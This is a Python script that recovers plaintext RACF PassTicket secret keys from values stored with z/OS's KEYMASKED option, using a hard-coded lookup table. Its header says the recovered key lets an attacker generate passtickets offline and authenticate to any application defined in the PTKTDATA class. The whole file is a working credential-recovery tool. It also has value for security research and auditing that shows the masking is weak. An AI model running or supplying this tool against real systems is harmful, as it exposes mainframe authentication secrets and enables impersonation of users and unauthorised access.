#!/usr/bin/python
import argparse
import sys

################################################################################
#                                                                              #
#  Date:      April 9, 2018                                                    #
#  Author:    Big E. Smalls                                                    #
#  Thanks to:                                                                  #
#      Ayoub (color routines)                                                  # 
#      Andrew VanVleet - initial passticket research & unmasking table         #
#                                                                              #
#  This program will "unmask" RACF passtickets which were generated on         #
#       z/os using "KEYMASKED" ssignon storage option described here:          #
#       https://www.ibm.com/support/knowledgecenter/en/                        #
#            SSLTBW_2.2.0/com.ibm.zos.v2r2.icha700/ssmask.htm                  #
#                                                                              #
#  Define statement looks like the following:                                  #
#  RDEFINE PTKTDATA <app><grp> SIGNON(KEYMASKED(0000000000000000)) UACC(NONE)  #
#                                                                              #
#  The ssignon key is trivially stored in the racf database and this script    #
#      can be used to retrieve the original secret key.  Using it, passtickets #
#      can be generated offline and used to authenticate to any app            #
#      defined in the PTKTDATA class (assuming appropriate user, group are     #
#      used as documented in the z/OS RACF Security Admin Guide                #
#                                                                              #
################################################################################

################################################################################
# for pretty colors - thanks Ayoub :)                                          #
################################################################################

class bcolors:
    HEADER = '\033[95m'
    BLUE = '\033[94m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    ENDC = '\033[0m'
    CYAN="\033[36m"
    PURPLE="\033[35m"
    WHITE=""
    DARKGREY = '\033[1;30m'
    DARKBLUE = '\033[0;34m'

    def disable(self):
        self.HEADER = ''
        self.BLUE = ''
        self.GREEN = ''
        self.YELLOW = ''
        self.RED = ''
        self.ENDC = ''

################################################################################
# global var & const
################################################################################

l_lookup = list()
ERR = 'err'
WARN = 'warn'
INFO = 'info'
GOOD = 'good'

################################################################################
# pretty output function - thx ayoub                                           #
################################################################################

def whine(text, kind='clear', level=0):
  """
    Handles screen messages display
  """
  typdisp = ''
  lvldisp = ''
  color =''
  if kind == 'warn': typdisp = '[!] ';color=bcolors.YELLOW
  elif kind == 'info': typdisp = '[+] ';color=bcolors.WHITE
  elif kind == 'err': typdisp = '[#] ';color=bcolors.RED
  elif kind == 'good': typdisp = '[*] ';color=bcolors.GREEN
  if level == 1: lvldisp = "\t"
  elif level == 2: lvldisp = "\t\t"
  elif level == 3: lvldisp = "\t\t\t"
  print(color+lvldisp+typdisp+text+ (bcolors.ENDC if color!="" else ""))

################################################################################
#  Lookup tables - thanks to AV for the assist!                                #
################################################################################

def init_list():
  global l_lookup
  l_lookup = [
    list("BBFCD18E826660B6"),
    list("AAEDC09F937771A7"),
    list("99DEF3ACA0444294"),
    list("88CFE2BDB1555385"),
    list("FFB895CAC62224F2"),
    list("EEA984DBD73335E3"),
    list("DD9AB7E8E40006D0"),
    list("CC8BA6F9F51117C1"),
    list("337459060AEEE83E"),
    list("226548171BFFF92F"),
    list("11567B2428CCCA1C"),
    list("00476A3539DDDB0D"),
    list("77301D424EAAAC7A"),
    list("66210C535FBBBD6B"),
    list("55123F606C888E58"),
    list("44032E717D999F49")
  ]

################################################################################
#  return secret key                                                           #
################################################################################

def decode_key(kval_list):
  global l_lookup
  rkey = list()
 
  for cval in range(0,16):
    for cpos in range(0,16):
      test = l_lookup[cpos][cval]
      if test == kval_list[cval]:
        rkey.append("{0:X}".format(cpos))
        continue
  if len(rkey) == 16:
    return "".join(rkey)
  else:
    whine("Error, invalid input - cannot unmask",ERR)
    return ""

    
################################################################################
# validate key len                                                             #
################################################################################

def get_key(kval):
  key = "X"
  kval = kval.upper()
  
  if (len(kval) != 16):
    whine("Error processing key \'{0:s}\' length not 16.".format(kval),ERR)
    return ""
  else:
    whine("Decoding: {0:s}".format(kval),GOOD)
    key = decode_key(list(kval))
    return key

################################################################################
# main prog                                                                    #
################################################################################

if __name__ == "__main__":
  init_list()
  parser = argparse.ArgumentParser()
  parser.add_argument("masked_key")
  args = parser.parse_args()

  k = get_key(args.masked_key)
  if k != "":
    whine("Plaintext key: " + k, INFO, 1)
  else:
    whine("Exiting.",ERR)
    sys.exit(1)

  sys.exit(0)
